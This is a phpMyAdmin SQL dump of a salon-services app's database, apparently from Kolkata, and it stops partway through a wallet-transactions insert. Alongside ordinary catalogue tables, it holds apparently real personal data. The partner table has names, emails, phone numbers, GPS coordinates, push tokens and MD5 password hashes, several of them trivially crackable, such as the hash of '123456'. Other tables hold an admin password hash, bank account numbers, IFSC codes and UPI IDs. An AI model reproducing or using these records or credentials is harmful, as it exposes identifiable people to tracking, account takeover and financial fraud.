-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Jan 20, 2022 at 03:11 PM
-- Server version: 10.5.12-MariaDB-cll-lve
-- PHP Version: 7.2.34

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `u333128179_dudesndamsels`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` longtext NOT NULL,
  `password` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'admin', 'e6e061838856bf47e1de730719fb2609');

-- --------------------------------------------------------

--
-- Table structure for table `banner`
--

CREATE TABLE `banner` (
  `id` int(11) NOT NULL,
  `img` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `mid` int(11) NOT NULL DEFAULT 0,
  `sid` int(11) NOT NULL DEFAULT 0,
  `cid` int(11) NOT NULL DEFAULT 0,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `banner`
--

INSERT INTO `banner` (`id`, `img`, `mid`, `sid`, `cid`, `status`) VALUES
(21, 'http://admin.dudeanddamsels.com/assets/images/img/1638818931app4.jpg', 0, 0, 0, 1),
(22, 'http://admin.dudeanddamsels.com/assets/images/img/1638818946app2.jpg', 0, 40, 22, 1),
(23, 'http://admin.dudeanddamsels.com/assets/images/img/1638818965app3.jpg', 0, 0, 0, 1),
(24, 'http://admin.dudeanddamsels.com/assets/images/img/1638818982app1.jpg', 0, 24, 10, 1);

-- --------------------------------------------------------

--
-- Table structure for table `category`
--

CREATE TABLE `category` (
  `id` int(11) NOT NULL,
  `cat_subtitle` text CHARACTER SET utf8 NOT NULL,
  `cat_name` text CHARACTER SET utf8 NOT NULL,
  `cat_status` int(11) NOT NULL,
  `cat_img` text NOT NULL,
  `cat_video` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `category`
--

INSERT INTO `category` (`id`, `cat_subtitle`, `cat_name`, `cat_status`, `cat_img`, `cat_video`) VALUES
(10, 'SKIN CARE SERVICES', 'SKIN CARE SERVICES', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1638428055skincare-1588698347.png', 'http://admin.dudeanddamsels.com/assets/images/video/1640492619skin.mp4'),
(14, 'HAIR SERVICES', 'HAIR SERVICES', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1638429288hair.jpeg', 'http://admin.dudeanddamsels.com/assets/images/video/1638952898final_61afa6a54e4782005b27071d_75189.mp4'),
(20, 'THREADING & FACE WAX', 'THREADING & FACE WAX', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1638429362threading-vs-waxing.jpg', 'http://admin.dudeanddamsels.com/assets/images/video/1640495039thearding.mp4'),
(21, 'WAXING', 'WAXING', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1638429430ds_leg-waxing.png', 'http://admin.dudeanddamsels.com/assets/images/video/1640493709wax.mp4'),
(22, 'MAKEUP', 'MAKEUP', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1638429505makeup.jpg', 'http://admin.dudeanddamsels.com/assets/images/video/1640415092makeup.mp4'),
(23, 'CLEAN UP', 'CLEAN UP', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1640862697WhatsApp_Image_2021-12-30_at_16_40_00.jpeg', '');

-- --------------------------------------------------------

--
-- Table structure for table `g_subcategory`
--

CREATE TABLE `g_subcategory` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `title` text CHARACTER SET utf8 NOT NULL,
  `img` text DEFAULT NULL,
  `status` int(11) NOT NULL,
  `video` text DEFAULT NULL,
  `city_id` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `g_subcategory`
--

INSERT INTO `g_subcategory` (`id`, `cid`, `title`, `img`, `status`, `video`, `city_id`) VALUES
(1, 1, 'New Lusso Bella', 'http://admin.dudeanddamsels.com/assets/images/img/1636483957lusso_bella.jpeg', 1, 'http://admin.dudeanddamsels.com/assets/images/video/1636492293mov_bbb.mp4', '[\"1\",\"3\",\"4\"]'),
(2, 1, 'Dreamland Ladies Beauty Parlour', 'http://admin.dudeanddamsels.com/assets/images/img/1636484148parlour.jpg', 1, 'http://admin.dudeanddamsels.com/assets/images/video/1636492283mov_bbb.mp4', ''),
(3, 2, 'Womens Beauty Spa & Body Massage Centre', 'http://admin.dudeanddamsels.com/assets/images/img/1636483749spa.png', 1, 'http://admin.dudeanddamsels.com/assets/images/video/1636492268mov_bbb.mp4', ''),
(4, 2, 'Jinan Thai Spa', 'http://admin.dudeanddamsels.com/assets/images/img/1636483627jinan_thai_spa.jpg', 1, 'http://admin.dudeanddamsels.com/assets/images/video/1636492234mov_bbb.mp4', ''),
(5, 3, 'tredg', 'http://admin.dudeanddamsels.com/assets/images/img/1636810409outsource-medical-call-center-services.jpg', 1, 'http://admin.dudeanddamsels.com/assets/images/video/1636492206mov_bbb.mp4', '[\"3\"]'),
(8, 4, 'tan', 'http://admin.dudeanddamsels.com/assets/images/img/1636783538best-sales-banner.jpg', 1, 'http://admin.dudeanddamsels.com/assets/images/video/1636580789mov_bbb.mp4', '[\"3\"]'),
(9, 5, 'Keratin', 'http://admin.dudeanddamsels.com/assets/images/img/1636782918karetin.jpg', 1, NULL, '[\"1\",\"3\"]'),
(12, 3, 'Men Hair Cut', 'http://admin.dudeanddamsels.com/assets/images/img/1636820546men-hair-cut.jpg', 0, NULL, '[\"1\",\"3\",\"5\"]'),
(13, 1, 'Woman Hair Color', 'http://admin.dudeanddamsels.com/assets/images/img/1636820704woman_hair_color.jpg', 0, NULL, '[\"1\",\"3\",\"4\",\"5\",\"6\"]'),
(14, 2, 'Spa Getting Full Body Massage', 'http://admin.dudeanddamsels.com/assets/images/img/1636820858spa_body_message.jpg', 0, NULL, '[\"1\",\"3\",\"4\",\"5\",\"6\"]'),
(17, 5, 'Rebonding', 'http://admin.dudeanddamsels.com/assets/images/img/1636869482Hair-Rebonding.jpg', 1, NULL, '[\"1\",\"3\"]'),
(19, 5, 'Hair Spa', 'http://admin.dudeanddamsels.com/assets/images/img/1636872775hair_spa.jpg', 1, NULL, '[\"1\",\"3\"]'),
(20, 5, 'Hair Cut', 'http://admin.dudeanddamsels.com/assets/images/img/1636872881hair_cut.jpg', 1, NULL, '[\"1\",\"3\"]'),
(21, 5, 'Straightening', 'http://admin.dudeanddamsels.com/assets/images/img/1636872980hair-straight.jpg', 1, NULL, '[\"1\",\"3\"]'),
(22, 5, 'Smoothening', 'http://admin.dudeanddamsels.com/assets/images/img/1636873085Hair-Smoothening.jpg', 1, NULL, '[\"1\",\"3\"]'),
(24, 10, 'FACIAL', 'http://admin.dudeanddamsels.com/assets/images/img/1638429718facial1.jpg', 1, NULL, '[\"1\",\"3\"]'),
(25, 5, 'HAIR COLOUR', 'http://admin.dudeanddamsels.com/assets/images/img/1638343318DD_Black_1024.png', 1, NULL, '[\"1\",\"3\"]'),
(27, 14, 'Hair Cut', 'http://admin.dudeanddamsels.com/assets/images/img/1638429787hair_cut.jpg', 1, NULL, '[\"1\",\"3\"]'),
(28, 14, 'Hair Colour', 'http://admin.dudeanddamsels.com/assets/images/img/1638429939hair_colour.jpg', 1, NULL, '[\"1\",\"3\"]'),
(29, 14, 'Hair Spa', 'http://admin.dudeanddamsels.com/assets/images/img/1638429968hair_spa.jpg', 1, NULL, '[\"1\",\"3\"]'),
(30, 14, 'Keratin', 'http://admin.dudeanddamsels.com/assets/images/img/1638429986karetin.jpg', 1, NULL, '[\"1\",\"3\"]'),
(31, 14, 'Straightening/ Rebonding', 'http://admin.dudeanddamsels.com/assets/images/img/1638430015hair-straight.jpg', 1, NULL, '[\"1\",\"3\"]'),
(33, 14, 'Ironing & Curling', 'http://admin.dudeanddamsels.com/assets/images/img/1638430532Ironing_Curling.jpg', 1, NULL, '[\"1\",\"3\"]'),
(35, 15, 'Global ( Schwarzkopf)', 'http://admin.dudeanddamsels.com/assets/images/img/1638358257D_D.jpeg', 1, NULL, '[\"1\",\"3\"]'),
(36, 20, 'Threading', 'http://admin.dudeanddamsels.com/assets/images/img/1638431459threading.jpg', 1, NULL, '[\"1\",\"3\"]'),
(37, 20, 'Face Wax', 'http://admin.dudeanddamsels.com/assets/images/img/1638431821facewax.jpg', 1, NULL, '[\"1\",\"3\"]'),
(38, 21, 'WAXING', 'http://admin.dudeanddamsels.com/assets/images/img/1638433387wax.jpg', 1, NULL, '[\"1\",\"3\"]'),
(39, 22, 'Bridal', 'http://admin.dudeanddamsels.com/assets/images/img/1638861570bridal.jpg', 1, NULL, '[\"1\",\"3\"]'),
(40, 22, 'Party', 'http://admin.dudeanddamsels.com/assets/images/img/1638861691party.jpg', 1, NULL, '[\"1\",\"3\",\"5\"]'),
(41, 23, 'Casmara Clean up', 'http://admin.dudeanddamsels.com/assets/images/img/1640863301casmara.jpg', 1, NULL, '[\"1\",\"3\"]'),
(42, 10, 'De- Tan', 'http://admin.dudeanddamsels.com/assets/images/img/1640936718WhatsApp_Image_2021-12-30_at_16_36_48_(1).jpeg', 1, NULL, '[\"1\",\"3\"]'),
(43, 10, 'Body Polishing', 'http://admin.dudeanddamsels.com/assets/images/img/1640938157WhatsApp_Image_2021-12-31_at_13_38_09.jpeg', 1, NULL, '[\"1\",\"3\"]');

-- --------------------------------------------------------

--
-- Table structure for table `partner`
--

CREATE TABLE `partner` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `email` text NOT NULL,
  `mobile` text NOT NULL,
  `password` text NOT NULL,
  `ccode` text NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `rdate` datetime NOT NULL,
  `credit` int(11) NOT NULL DEFAULT 0,
  `city` text DEFAULT NULL,
  `address` text DEFAULT NULL,
  `category_id` int(11) NOT NULL DEFAULT 0,
  `aprove` int(11) NOT NULL DEFAULT 0,
  `pimg` text DEFAULT NULL,
  `bio` text DEFAULT NULL,
  `rate` int(11) NOT NULL DEFAULT 5,
  `commission` int(11) NOT NULL DEFAULT 0,
  `wallet` float NOT NULL DEFAULT 0,
  `lats` text NOT NULL,
  `longs` text NOT NULL,
  `a_token` text DEFAULT NULL,
  `code` int(11) DEFAULT NULL,
  `refercode` int(11) DEFAULT NULL,
  `is_active` double NOT NULL DEFAULT 1,
  `i_token` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `partner`
--

INSERT INTO `partner` (`id`, `name`, `email`, `mobile`, `password`, `ccode`, `status`, `rdate`, `credit`, `city`, `address`, `category_id`, `aprove`, `pimg`, `bio`, `rate`, `commission`, `wallet`, `lats`, `longs`, `a_token`, `code`, `refercode`, `is_active`, `i_token`) VALUES
(2, 'Arijit Das', 'arijitdas15@yahoo.com', '8583022812', 'dbf47fdd341651debbb39d7ca57af7be', '+91', 1, '2021-10-24 21:17:34', 0, 'Kolkata', '', 1, 0, 'assets/user/1637771761image_picker872030530163106536.jpg', '', 5, 0, 10501, '22.6985197', '88.4528449', 'dgQyu-gDCEjPi7vAiwi757:APA91bHBU-txsZGVjQGYunSWJQC3yYsN6MQjd4SDPHIp_kjzZiAj9f6APoLqexVJz528QvayoFW8xu9YFpzZVjESuoHlrHOoNGf68y4qRTJnJlGU27q3-xIhgrRZk6jtCY95omXMfMD0', 0, 936164, 1, ''),
(4, 'Farid Rahman', 'farid.meher@gmail.com', '8017010592', 'b198a0c91431acdbd6e4da5aedb89211', '+91', 1, '2021-11-04 13:43:17', 0, 'Kolkata', '', 1, 0, 'assets/user/1637428677image_picker3937980170591635825.jpg', '', 5, 0, 3000, '22.5662581', '88.3207253', 'fDa_RD4MlkhKvdHy-CWJsL:APA91bH3HIJ02VAu7yjt_uhBbarPz66zmAvzV-t2VnY0Orrl7UptI8D4ESsjwy0E6Wwhrvs352ulqUsDy8D9OgdeaG30fMespj8NUSdPS34QN-oNBQ_lxcZXk6L00WoL3YhYp6qY4d5u', NULL, NULL, 1, ''),
(5, 'Suvayan Sardar', 'suvayan.eije.258@gmail.com', '9088224854', '8ab4a4388eb574308bfc3bf9503355e4', '+91', 1, '2021-11-08 19:04:16', 0, 'Sonarpur', 'Baidyapara Road, Sonarpur, Kolkata, West Bengal 700150', 1, 0, ' ', '', 5, 0, 900, '22.4402745', '88.4254241', 'cDXsFWGfSZ-YYl3M5CCQY2:APA91bHBrP_JzGMnvPLujredwOqM5mgPoixJJALzNPuullg1hZn-wFgt3c-miG7iZLkJAKkTEFtNtTHdCgB5FR08-fIqXv--UWK64sZAN9BAI6jT7DD8YRSOqSsR_yY6yiAuUrqphIb6', NULL, NULL, 1, ''),
(9, '', '', '9734103591', '', '+91', 1, '2021-11-13 15:07:31', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '22.5651384', '88.3204384', 'cSL9VakCQJW8AIbdvFNUpx:APA91bGCaDsMATAukg-wuXfBv5xLpSIbXTUEj5t8gyJeGaVTbQLhcqnQ88fV8_YL9pdLWD0bVAxe_BnZdriuUdoRuO7UfIgFKauQEW8PP0psC3mlcIKwbAeHiP9LsWAAr-h61lB1Kj2e', NULL, 115979, 1, ''),
(10, 'Mostofa Rahman', 'mostofa.rahman65@gmail.com', '9734103591', 'e10adc3949ba59abbe56e057f20f883e', '+91', 1, '2021-11-13 15:22:54', 0, 'Kolkata', '', 1, 0, 'assets/user/1636817268image_picker8329211196607673925.jpg', '', 5, 0, 0, '22.5629451', '88.3225913', 'cSL9VakCQJW8AIbdvFNUpx:APA91bGCaDsMATAukg-wuXfBv5xLpSIbXTUEj5t8gyJeGaVTbQLhcqnQ88fV8_YL9pdLWD0bVAxe_BnZdriuUdoRuO7UfIgFKauQEW8PP0psC3mlcIKwbAeHiP9LsWAAr-h61lB1Kj2e', 1, 493031, 1, ''),
(12, '', '', '9123647108', '', '+91', 1, '2021-11-24 11:59:25', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 1500, '22.516629638064153', '88.35692746384731', 'fTl_EWfwRGK7o2EXr1WK9T:APA91bEwVcl1Vt6gUSV6ul0Yu6RBoCyFQCinRA23vt3914XoPlNBD_daevil3GnMO7WpypCviSf3YUtbV4yEsCUBpsPOe5lF0oq7ENhulApCFWeUXwAzjxwVAUmMHxhEn-EuLjuwAZnr', NULL, 134622, 1, ''),
(13, '', '', '8100500815', '', '+91', 1, '2021-12-01 06:30:04', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '22.5861819', '88.3296801', 'faqmS-GHQiGHACsqVJoGwa:APA91bEtG5yBF5LdM3vYeQHd-YpcJ5DtdMNVFa0YknTl74mpfoln1rxYdD9rVY6AuvcLfBzFbuoYwWZTJ1ajVoHfzeuMFIw4ot4duN35LFV0BsyiStL7YBVS_wjlACUv9R05KvYH11aI', NULL, 840281, 1, ''),
(14, '', '', '9874865447', '', '+91', 1, '2021-12-01 13:46:22', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '22.5632738', '88.323563', NULL, NULL, 295072, 0, NULL),
(17, '', '', '9330292981', '', '+91', 1, '2021-12-02 05:47:43', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '37.421998333333335', '-122.084', 'fbxX1E6dT0WRCFxiV8zrDH:APA91bFDYUYX_UeADkXFJMOpR2Z5ZxA2f2LLE-GBhEPRi0VOZrdoV0RzAPgDKO95fsRYkqoBxs2nSMDqrgIMcVr4zoPLdctmVvcr1ZlE4lnO7yPkoNtyLR6Qh9-QOtRdwk2zvyj--Gwh', NULL, 505498, 0, ''),
(18, '', '', '8709622895', '', '+91', 1, '2021-12-02 08:16:55', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '22.5662746', '88.3205954', 'drkW_9E5QeGPeN0jYvjoQz:APA91bEb2Ghmeld7qsJnjqNBeNjMmGEpNZzgeRjPCEkuLUDC70PoCWe3Z-eiHrVp7d54kKplz7KS_4SpQ2V0JnSJ93gqSP0jQmcIUB2Nv44vEbNSG3Nwy5NajKmSRKmdMU8ZTP2Di3r8', NULL, 773638, 0, ''),
(19, 'Baishali Dey', 'baishalidey1990.1990@gmail.com', '9674454049', '3ecb5036c065d3d3a8ef4131c4dfa2be', '+91', 1, '2021-12-02 10:42:40', 0, 'Kolkata', '', 1, 0, ' ', '', 5, 0, 1000, '22.5166106', '88.3569604', 'fTTYGaUVQtGnycoJxF6oJU:APA91bGbH4gTV4azw8RbinDE8og1ozQnW9nFn2ifSF4sj8c5kdj3VupciGv9X45ferzRNArR2D185DnrMevT0-HgcyF7d28ybfz7kmnOt4aLxQbhFFsIXI_Gxc0YfR52M3sDmCp_Raac', 123456, 478912, 1, ''),
(20, 'Anita das', 'anita007.das@gmail.com ', '9831076588', '6f1d8aee22bd98af8da49680715b5da2', '+91', 1, '2021-12-02 10:43:45', 0, 'Kolkata', '', 1, 0, 'assets/user/1638442430image_picker7439900035611202155.jpg', '', 5, 0, 1000, '22.5166017', '88.3569669', 'eLkK5Qu4QyS_5p5kfrsGIK:APA91bHY5kEFCUvH3ckeUjp1JdWIaFc0nFykPHB5nzyBdzmX3h-8T7TcdZPfh37Zp6eOuMXnrBqDuxhDy4-ir6C-A0H9FirQ7-MeDjUpA9P6N35m2BJ1EuncDkDZQ-ni9ZzWsSnORHl5', 123456, 773044, 0, ''),
(21, 'Soni Ali', 'soniali562@gmail.com', '8420615446', '40c6cfed5f1334e012bb042e7f016fce', '+91', 1, '2021-12-02 10:51:28', 0, 'Kolkata', '', 1, 0, 'assets/user/1638514141image_picker1403309287372792028.jpg', '', 5, 0, 0, '22.5166104', '88.3569638', 'f_LnmfQgRkqBDBOiLmjnhM:APA91bFFc9LfpKl-BdUVkPZ4EoCYkTHpj11nlKLt4tU8tB5X04oOGi4pc84JLaeNqsCvRgL2agpIe1SqBv4GXidIYE4_NOsnXv3DlgSoB6GlnBUMNiMpS9EvaNyOZXe_EjUZmDh8U2ba', 123456, 985878, 0, ''),
(22, 'mahuya das', 'indranidas1899@gmail.com', '9123647108', 'e10adc3949ba59abbe56e057f20f883e', '+91', 1, '2021-12-02 10:53:24', 0, 'Kolkata', '', 22, 0, ' ', '', 5, 0, 1500, '22.5166107', '88.3569599', 'fTl_EWfwRGK7o2EXr1WK9T:APA91bEwVcl1Vt6gUSV6ul0Yu6RBoCyFQCinRA23vt3914XoPlNBD_daevil3GnMO7WpypCviSf3YUtbV4yEsCUBpsPOe5lF0oq7ENhulApCFWeUXwAzjxwVAUmMHxhEn-EuLjuwAZnr', 123456, 342892, 1, ''),
(23, 'Jhumpa Roy', 'jhumparoy07849@gmail.com', '9748354518', 'b5cace2617fc0df9e5368e9cecffe21a', '+91', 1, '2021-12-02 10:57:59', 0, 'Kolkata', '', 10, 0, ' ', '', 5, 0, 0, '22.516613', '88.3569562', 'fWaTr4qbQUSmDyyfOj-Ebl:APA91bErP_w1XBNM3OBMjHJfKuPrtTFiwC9N0w1E-n4jetP80FL_ndxyxbtL7cHlSl8JpPvcpjv3MAGZlQby-Nc02ta-rciV4RyJckVzL1XLGaO1sF03HLOoQOcZv1hqP9RVOzNWxCMZ', 123456, 184550, 0, ''),
(24, 'tumpa poddar', 'tumparoy68@gmail.com', '8335091371', '2f100709dda0bde31c5af8e34aa9d071', '+91', 1, '2021-12-02 11:10:39', 0, 'Kolkata', '', 10, 0, ' ', '', 5, 0, 1000, '0.0', '0.0', 'f7Vjrcy_Sey6kgv7HbpEjg:APA91bHsqr5XopiR86TJZETepGCSAXjR7RiQnhLZgFz0cPV6_js4V5dfgYaCV_qO9YNV2EvG7tL6E3J3HXjLoNir1hdu7C88yLJfcaLFYDFooZCATx4f6msftXQ7gPqzpOYPO71UqlIc', 123456, 654161, 0, ''),
(25, 'Anita Das', 'akashanita007@gmail.com', '8420299066', '9ad8441833bad617ca7382b331b27500', '+91', 1, '2021-12-02 11:11:23', 0, 'Kolkata', '', 1, 0, 'assets/user/1639483008image_picker6913338625603915363.jpg', '', 5, 0, 1000, '22.5166119', '88.3569667', 'ewHgqYjaSQi6QXQRoPQFIa:APA91bFt8IFNJ9JJqAStN7mCacvYsQ25EtwvOgbUa76e2HLLUmlgsImepTik2mL8W-2Zpq1CHN8PHWTPliCDTEB5ZqNu0T1YcuZlXL0RB8JObJrN3RzzNkdcPl3d-MAzBvYWJmCdZDEd', 123456, 579514, 0, ''),
(26, 'Baishali Dey', 'enterpriseb25@gmail.com', '9674454049', 'a29caf1c30407725f98dadbe0556441e', '+91', 1, '2021-12-02 14:59:21', 0, 'Kolkata', '', 10, 0, ' ', '', 5, 0, 0, '22.5455543', '88.3845714', 'cQr3up5VQYKF0jDzm4DL7Y:APA91bFUchIKhAqi7Nr1HLB5NCMVQCBPtWRN3U5DthJHlL54PBfXWrQEmaBznoipXUvcWwhBV7wvlRtIB2PguscMXYJt2fYgaVdz4zfNogaOhb4myDFXJMaiu7TYCYXf1RufDgT7IEL4', 123456, 526298, 0, ''),
(27, 'anita das', 'akashanita77@gmail.com', '8420299066', 'dd4b21e9ef71e1291183a46b913ae6f2', '+91', 1, '2021-12-03 03:35:31', 0, 'Kolkata', '', 1, 0, 'assets/user/1638504816image_picker9083719737238510751.jpg', '', 5, 0, 0, '22.5556304', '88.373858', 'eHPfGyzpR8eFeScr9x5RMd:APA91bFukdVFs5rJkQhDIl65cD34W3OaGBuByYRo1L22qkEbJLIxeSaUyUJvDwjFVtnFpgyagY3Nzut0BXD_2srhTdp8GohJF68heQ0r_t0wtxwRwMEPBYcavfDuHqoeNDuIsuzjWy_H', 789654, 832252, 0, ''),
(28, 'ceetee manila', 'ctnewmnl1@gmail.com', '09178371389', '47b7bfb65fa83ac9a71dcb0f6296bb6e', '+91', 1, '2021-12-04 17:28:59', 0, 'Kolkata', '', 10, 0, ' ', '', 5, 0, 0, '14.5504234', '121.0721615', 'fgOSb-_VSVy5AX-B1Ht3cT:APA91bGr_hcTCeFidUzTbOY2HblXXkO5U3awz8i2_O80FiTf3_3mJr4v3KhumqxD_t1zu7eggpj7JzI2CCD8guOnLtxRhaDqmOCR8DN1sVHqKIY4cn1DjOiI2s5PPZZDkLm-j-lKuqlH', 123456, 609875, 0, ''),
(29, 'Arijit Das', 'arijit.das76@gmail.com', '9330292981', '785e5ada5275caf8a6fc6ebff43591b8', '+91', 1, '2021-12-06 05:40:10', 0, 'Kolkata', '', 14, 0, ' ', '', 5, 0, 0, '22.6984899', '88.4528261', 'cJDludz6CU5Pjx0xMwDYOY:APA91bHqSJdHR7JRx0gIiUgSDj-xJNxxCPteoD26wSvZsktmynEqW8i5UsLOfbvQ9_AzKuG-Ojtfn5qFDyOOwt7atydqiB_mVU5BSsAo3Nij1qpJsV4fhnjAU5qs9XKUMULBgNi6TPRs', 123456, 404340, 1, ''),
(30, 'Ram Das', 'ramdastianshi@gmail.com', '7278511412', '0f24c3c46bc6db13e0e7f0706c7f2b0f', '+91', 1, '2021-12-06 06:25:37', 0, 'Kolkata', '', 1, 0, 'assets/user/1639385702image_picker1494375292648142266.jpg', '', 5, 0, 0, '22.5166186', '88.3569593', 'caRw8jP3TDS82QXDMSmmYR:APA91bES0ES_LuBowT2SegQ0ylUr7vqtynCWzS9iCWgxjP9hpUA4HNVA0s8LtMdTACCFlPw3JW3nJGnTzaByOTB_BEF_63bfsGJOuh6IyxYSMe6aMMgR4ApG6MgUTD8o3UPtY7pEsYvf', 123456, 658647, 1, ''),
(32, '', '', '9123337076', '', '+91', 1, '2021-12-13 08:28:37', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '22.5166159', '88.3569421', '', NULL, 875762, 0, ''),
(33, '', '', '8013171045', '', '+91', 1, '2021-12-18 13:36:40', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '22.4871106', '88.3598186', 'el20ulNIR7yhy7DvK2oiOu:APA91bGgzyQJUiWXdV7SiPdfV5Wz_ACP8NO2qj7QMofpQvtGzCHm7p5XI1tDh6R6-Crrs2KBckEX3kUhoDfWFFj-zy6_fivN7nlGTTVXQG6rYHz7h6orZtI7gMv1761tEqOc_edpGIsu', NULL, 215811, 0, ''),
(34, '', '', '7687982333', '', '+91', 1, '2021-12-20 11:52:17', 0, NULL, NULL, 0, 0, NULL, NULL, 5, 0, 0, '22.5166574', '88.3569961', '', NULL, 194376, 0, ''),
(35, 'Soni Ali', 'soniali562ashu@gmail.com', '9123337076', 'e2a6cec91241eab0b1e9720efe528e00', '+91', 1, '2022-01-06 12:21:43', 0, 'Kolkata', '', 10, 0, ' ', '', 5, 0, 0, '22.5166665', '88.3570033', NULL, 123456, 711161, 0, NULL),
(36, 'Soni Ali', 'sonialiaishu786@gmail.com', '9123337076', 'ccd93a29fe0b0a3af2a1d5daec7d1030', '+91', 1, '2022-01-07 07:28:54', 0, 'Kolkata', '', 1, 0, 'assets/user/1641540760image_picker7437186507399141920.jpg', '', 5, 0, 1000, '22.5166582', '88.3570142', 'f-MoLPGMQQqca3j8IxpKA2:APA91bG6qSNN10nwrFV2UyM-NvJusH9eEfdQRNby-mEmCQz52clPtf3VEHkEdeRFT3ml1rSgqnwZSphVCh8PHpMyQqCJ7445YYgOyhBW6Tk1xUqfygV_owfgiRfPiyW0vPCwI2F3yXut', 123456, 806297, 1, '');

-- --------------------------------------------------------

--
-- Table structure for table `partner_bank_details`
--

CREATE TABLE `partner_bank_details` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `ac_no` varchar(225) COLLATE utf8mb4_unicode_ci NOT NULL,
  `b_name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `ifsc` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `partner_bank_details`
--

INSERT INTO `partner_bank_details` (`id`, `pid`, `name`, `ac_no`, `b_name`, `ifsc`, `status`) VALUES
(2, 2, 'Arijit Das', '1234567890562', 'SBI', 'SBI000178', 1),
(3, 2, 'Arijit Das', '6783459034', 'HDFC', 'HDFC0001267', 1),
(4, 2, 'Arijit Das', '105601584590', 'ICICI', 'ICIC0001278', 1);

-- --------------------------------------------------------

--
-- Table structure for table `partner_upi_details`
--

CREATE TABLE `partner_upi_details` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `upi` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `partner_upi_details`
--

INSERT INTO `partner_upi_details` (`id`, `pid`, `name`, `upi`, `status`) VALUES
(2, 2, 'Arijit Das', 'arijit76@sbi.com', 1),
(3, 2, 'Arijit Das', 'arijit.das-3@icici.com', 1),
(4, 2, 'Arijit Das', 'arijit.das@hdfc.com', 1),
(5, 4, 'Farid Rahman', 'gennnextit@okaxis', 1);

-- --------------------------------------------------------

--
-- Table structure for table `partner_wallet_report`
--

CREATE TABLE `partner_wallet_report` (
  `id` int(11) NOT NULL,
  `pid` bigint(20) NOT NULL,
  `transaction_id` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `t_number` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `message` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `amt` double NOT NULL DEFAULT 0,
  `date` date DEFAULT NULL,
  `month` varchar(225) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `year` varchar(225) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `time` varchar(225) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `partner_wallet_report`
--

INSERT INTO `partner_wallet_report` (`id`, `pid`, `transaction_id`, `t_number`, `message`, `status`, `amt`, `date`, `month`, `year`, `time`) VALUES
(1, 2, 'D&DPAY1000000000', '1000000000', '', 'credit', 1000, '2021-12-24', '12', '2021', '20:19:14 PM'),
(2, 4, 'D&DPAY1000000001', '1000000001', 'Cash', 'credit', 1000, '2021-12-25', '12', '2021', '05:16:19 AM'),
(3, 34, 'D&DPAY1000000002', '1000000002', 'Cash', 'credit', 1000, '2021-12-25', '12', '2021', '05:35:07 AM'),
(4, 34, 'D&DPAY1000000003', '1000000003', 'Cash', 'debit', 1000, '2021-12-25', '12', '2021', '05:36:07 AM'),
(5, 24, 'D&DPAY1000000004', '1000000004', 'Cash', 'credit', 1000, '2021-12-25', '12', '2021', '05:40:09 AM'),
(6, 22, 'D&DPAY1000000005', '1000000005', 'Cash', 'credit', 1500, '2021-12-25', '12', '2021', '05:40:44 AM'),
(7, 19, 'D&DPAY1000000006', '1000000006', 'Cash', 'credit', 1000, '2021-12-25', '12', '2021', '05:41:04 AM'),
